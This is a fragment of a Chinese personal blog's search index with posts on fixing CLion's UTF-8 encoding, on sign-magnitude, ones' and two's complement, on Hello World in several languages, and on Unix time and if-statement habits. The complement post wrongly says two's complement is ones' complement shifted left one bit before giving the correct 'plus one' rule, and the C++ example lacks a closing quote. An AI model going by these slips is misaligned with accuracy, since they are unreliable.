        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jetbrains.com/zh-cn/clion/download/#section=windows">官网下载链接</a></p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>jetbrains系列的软件其实还挺好用的。<br>但是windows平台的编码是真的搞。<br>方法应该是通用的对于jb系列的软件——此处以clion为例。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先就是安装clion，上述参考链接含官网下载地址。</p><p>网上不靠谱的就是让你把文件编码改成<code>GBK</code>，这种就是典型治标不治本的做法；比较常用编码大部分是<code>utf-8</code>。当然win平台常见的是ANSI和Unicode两种，这里就是浅浅的改变成utf-8，不需要的则没关系。</p><h2 id="1-setting"><a href="#1-setting" class="headerlink" title="1.setting"></a>1.setting</h2><p>打开file，找到setting</p><img src="/2021/01/30/cliontoutf-8/000.png" class=""><blockquote><p>找到Editor，选择Console，将default encoding也修改成utf-8</p></blockquote><img src="/2021/01/30/cliontoutf-8/001.png" class=""><blockquote><p>再在Editor下找到file encodings，全设置为utf-8</p></blockquote><img src="/2021/01/30/cliontoutf-8/002.png" class=""><blockquote><p>找到我们clion的安装目录下的Bin&#x2F;,看到这个clion64.exe.vmoptions之后用记事本或者notepad打开都行，在末尾加上一句-Dfile.encoding&#x3D;UTF-8</p></blockquote><img src="/2021/01/30/cliontoutf-8/003.png" class=""><img src="/2021/01/30/cliontoutf-8/004.png" class=""><blockquote><p>如果是idea好像还有个idea.exe.vmoptions，也就是不带64的，估计是32位的意思吧，反正都加上。</p></blockquote><p>然后在clion界面，按住<code>Ctrl+Shift+Alt+/</code>，选择Registry，取消run.processes.with.pty的勾选。</p><p>不放心还可以在：</p><img src="/2021/01/30/cliontoutf-8/005.png" class=""><img src="/2021/01/30/cliontoutf-8/006.png" class=""><blockquote><p>加一句-Dfile.encoding&#x3D;UTF-8</p></blockquote><p>至于终端类型切不切换都无所谓，一个cmd或者一个powershell</p><img src="/2021/01/30/cliontoutf-8/007.png" class=""><p>然后开始测试一下：</p><img src="/2021/01/30/cliontoutf-8/008.png" class=""><p>点击右上角的锤子然后点击小箭头，也可以快捷键操作。</p><img src="/2021/01/30/cliontoutf-8/009.png" class=""><p>看到中文正常显示就行了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>idea不常用就不写了,<br>可以参考一下clion，毕竟都是一个公司的产品<br>或者百度搜索这个版本的</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jetbrains </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原码、反码、补码的关系</title>
      <link href="/2021/01/01/threeYards/"/>
      <url>/2021/01/01/threeYards/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>计算机三码的问题我记得很早的时候在本地typora上写过后面好像丢了。<br>但是还是要加强一下印象，就回头在写到博客上好了。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先，三码是哪三码：原码、反码、补码；</p><hr><h2 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h2><p>原码可不是一个数简单转换成二进制就完事了，需要注意的是在二进制的最高位是代表了符号位，也就是说代表了这个数是整数还是负数，0表示正数，1则表示负数。</p><p><strong>本文介绍统一采用一字节的方式举例</strong><br>例如<code>86</code>的原码应该是<code>0101 0110</code>;<br>而<code>-86</code>的原码则是<code>1101 0110</code>;</p><blockquote><p>此时切记不能将原码和传统二进制混淆。</p></blockquote><hr><h2 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h2><p>正数的反码与原码一致，负数的反码除去符号位，其余取反。<br>还是<code>86</code>为例，它的反码依然是<code>0101 0110</code>;<br>而<code>-86</code>，它的反码则是<code>1010 1001</code>。</p><hr><h2 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h2><p>正数的补码依然与原码一致，负数的补码则是在反码基础上左位移1位。<br><code>86</code>的补码为<code>0101 0110</code>;<br><code>-86</code>的补码为<code>1010 1010</code>;</p><hr><p>那么为什么要这么麻烦呢，起初发明原码的目的就是为了能够很好的区分出正负的概念，使用原码的方式读写，是方便了人，但是计算机就吃苦了。</p><p><code>(+1) + (-1)=0</code>这是常识，但是转换成原码<code>0000 0001 + 1000 0001 = 1000 0010</code>，<code>1000 0010</code>按照原码的概念高位为符号位，就成了<code>-2</code>，这就变成搬起石头砸自己的脚了。</p><p>所以在原码的基础上，又产生了反码的概念，上述提过，反码的目的其实也是为了解决负数的问题<br><code>(+1) + (-1) = 0</code>还是这个题<br>换成原码时：<code>0000 0001 + 1000 0001 = 1000 0010</code><br>加入反码后：<code>0000 0001 + 1111 1110 = 1111 1111</code><br>正数的0我们知道原码应该是<code>0000 0000</code>，但是这里的结果是<code>1111 1111</code>。<br>首先这个<code>1111 1111</code>还是处于反码的阶段，我们将其转换为原码：<code>1000 0000</code>。<br>而这一比较就会发现，转换后的原码解读应该是<code>-0</code>。<br>虽然结果有那点意思了，但是数学常识0就是0，没有正负之分才对。</p><p>最后在不断折磨下，又出现了补码，所以说正数的三码为什么都是一个样的，反码和补码的出现都是为了解决负数的问题。<br>补码就是反码+1，所以当<code>-1</code>的反码<code>1111 1110</code>转换成补码后应该是<code>1111 1111</code><br>正数的三码一致，<code>(+1) + (-1) = 0</code>，变成补码形式<code>0000 0001 + 1111 1111 = 1 0000 0000</code>,一字节的情况下只能表示8个比特，所以最高位会被丢弃掉。也就是<code>0000 0000</code>，也就是我们计算机和数学中最为正确的0。</p><blockquote><p>在明白了基础概念之后，我们可以浅浅的随便算几个数字之和情况下三码的形式。</p></blockquote><hr><h2 id="86-67"><a href="#86-67" class="headerlink" title="(+86) + (-67)"></a>(+86) + (-67)</h2><p>原码：<code>0101 0110 + 1100 0011</code><br>反码：<code>0101 0110 + 1011 1100</code><br>补码：<code>0101 0110 + 1011 1101</code><br>最后之和：<code>1 0001 0011</code>，丢弃多余的高位，转换成十进制也就是19</p><hr><h2 id="96-36"><a href="#96-36" class="headerlink" title="(+96) + (-36)"></a>(+96) + (-36)</h2><p>原码：<code>0110 0000 + 1010 0100</code><br>反码：<code>0110 0000 + 1101 1011</code><br>补码：<code>0110 0000 + 1101 1100</code><br>求和：<code>1 0011 1100</code>，丢弃多余的，转换成十进制就是60</p><hr><h2 id="101-27"><a href="#101-27" class="headerlink" title="(101) - (-27)"></a>(101) - (-27)</h2><p>老算加法没意思，回头看看减法呢？<br>这里也是要提的点，计算机本身其实是比较笨的，因为他只会进行+运算，原因在于计算机是通过电路设计的，那么交给他的活自然不能太繁琐，且在数学领域下，减去一个正数就等于加上这个正数变成负数的值：即<code>1-1 = 1 + (-1) = 0</code>，这也是为什么上述两个计算题还是使用加法的问题，其实<code>(+86) + (-67)</code>就是等于<code>86-67</code>。所以减法也不例外，减去一个负数就等于加上这个负数变符号成正数的结果。<br>故此<code>(101) - (-27) = 101 + 27 = 128</code></p><p>计算方式如下：<br>原码：<code>0110 0101 + 0001 1011</code><br>反码：<code>0110 0101 + 0001 1011</code><br>补码：<code>0110 0101 + 0001 1011</code><br>求和：<code>1000 0000</code>，现在按照原码或者反码来说它又是-0，实际上二进制应该表示为128了，但0已经有了它自己的编码<code>0000 0000</code>，所以补码<code>1000 0000</code>约定俗成给了-128。<br>这也是后来补码的优势，补码不仅区分0存在两个编码的问题，还可以让计算机多表示一个数[-128,127]，如果按照原码或者反码一个字节就只能表示[-127,+127]。</p><blockquote><p>如果你还记得编程语言中各类型的取值范围的话：比如char就是一字节，范围[-2^7 到 2^7-1]<br>int类型占用四字节，范围就是[-2^31 到 2^31-1]</p></blockquote><img src="/2021/01/01/threeYards/000.png" class=""><blockquote><p>可以看看这个图<br>正数不多解释三码一致0就是0000 0000直到127的补码0111 1111<br>按照补码习惯，1111 1111就表示为-1，-1的反码是1111 1110，原码是1000 0001<br>当然这也是因为一字节能够容纳这些数字，128的二进制是1000 0000</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>三码的过程还是很意思的，补码也是后面计算机存储用的编码方式；不好理解的再去找些视频看看，做几个题练练吧。</p><p>另外就是提到计算机本质上减法也是通过加法实现，乘除好像是通过位运算，但是最终结果还是累加得到的。不过记不太清了后面用到了再回来补一补。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/01/01/hello-world/"/>
      <url>/2021/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h1><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello world! &lt;&lt; std::endl;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>自我反省</title>
      <link href="/1970/01/01/%E8%87%AA%E7%9C%81/"/>
      <url>/1970/01/01/%E8%87%AA%E7%9C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="每一次的学习都是在接受自己的不足"><a href="#每一次的学习都是在接受自己的不足" class="headerlink" title="每一次的学习都是在接受自己的不足"></a>每一次的学习都是在接受自己的不足</h1><span id="more"></span><hr><h1 id="计算机时间起点1970-01-01"><a href="#计算机时间起点1970-01-01" class="headerlink" title="计算机时间起点1970.01.01"></a>计算机时间起点1970.01.01</h1><ol><li>最懒的解释<br> 很多编程语言起源于UNIX系统，而UNIX系统认为1970年1月1日0点是时间纪元，所以我们常说的UNIX时间戳是以1970年1月1日0点为计时起点时间的。</li><li>河狸的<br> 那时候的计算机操作系统是32位的<ul><li>32位能表示的最大值是2147483647。另外1年365天的总秒数是<code>31536000</code>，<code>2147483647/31536000 = 68.1</code></li><li>从1970年开始算，加上68.1年，实际最终可到2038年01月19日03时14分07秒，便会到 达最大时间，过了这个时间点，所有32位操作系统时间便会变为10000000 00000000 00000000 00000000，算下来也就是1901年12月13日20时45分52秒，这样便会出现时间回归的现象，很多软件便会运行异常了。</li></ul></li></ol><p>不过现如今的计算机都是64位了，大概能表示到<code>292,277,026,596年</code>，那以后就不是咱操心的了。</p><hr><h1 id="if骚操作"><a href="#if骚操作" class="headerlink" title="if骚操作"></a>if骚操作</h1><p>在常见的代码中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是变量在左，常量在右，但是有一种最傻的情况</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a = <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你少写了一个等于号，让比较条件变成了赋值条件，编译器是不会报错的，因为赋值语句是合法的。</p><p>将习惯改变之后，常量在左边，变量在右边</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">0</span> = a)&#123;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样编译器会很容易就给出错误提示。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
